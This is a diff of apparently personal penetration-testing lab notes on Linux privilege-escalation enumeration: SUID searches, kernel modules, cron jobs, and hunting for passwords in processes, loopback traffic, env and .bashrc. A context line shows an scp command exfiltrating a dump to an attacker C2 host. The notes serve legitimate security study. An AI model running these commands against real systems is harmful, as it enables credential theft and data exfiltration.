@@ -184,6 +184,10 @@ scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
 ### Ogolne info
 #### System
 * The /etc/issue and /etc/*-release files contain information about the operating system release and version. We can also run the uname -a command - shows kernell version.
+Permission check:
+```bash
+ls -lah /home/joe.sh
+```
 #### Procesy
 * We can list system processes (including those run by privileged users) with the ps command. We'll use the a and x flags to list all processes with or without a tty and the u flag to list the processes in a user-readable format.
 #### Network
@@ -216,9 +220,18 @@ find / -writable -type d 2>/dev/null
 ```bash
 lsblk
 ```
+#### SUID
 * SUID - (except rwx there's S) If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid). We can use find to search for SUID-marked binaries. In this case, we are starting our search at the root directory (/), searching for files (-type f) with the SUID bit set, (-perm -u=s) and discarding all error messages (2>/dev/null):
 ```bash
 find / -perm -u=s -type f 2>/dev/null
+```
+#### Drivers and kernel modules
+```bash
+lsmod
+```
+* Once we've collected the list of loaded modules and identified those, we want more information about, such as libata in the above example, we can use modinfo to find out more about the specific module. We should note that this tool requires the full path to run.
+```bash
+/sbin/modinfo libata
 ```
 ### User trails
 * Sometimes system administrators store credentials inside environment variables as a way to interact with custom scripts that require authentication.
@@ -230,6 +243,7 @@ env
 cat .bashrc
 ```
 ### Service footprints
+#### Processes
 * We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".
 ```bash
 watch -n 1 "ps -aux | grep pass"
@@ -239,15 +253,16 @@ Let's try to capture traffic in and out of the loopback interface, then dump its
 ```bash
 sudo tcpdump -i lo -A | grep "pass"
 ```
-####  drivers and kernel modules
+### Insecure file permissions
+#### CRON
+
 ```bash
-lsmod
+grep "CRON" /var/log/syslog
 ```
-* Once we've collected the list of loaded modules and identified those, we want more information about, such as libata in the above example, we can use modinfo to find out more about the specific module. We should note that this tool requires the full path to run.
 ```bash
-/sbin/modinfo libata
+ls -lah /etc/cron* # for active user
+sudo crontab -l # root
 ```
-#### SUID
 ## SHarphound BLoodhound
 ### bloodhound.py
 Sharphound data collector meant for linux
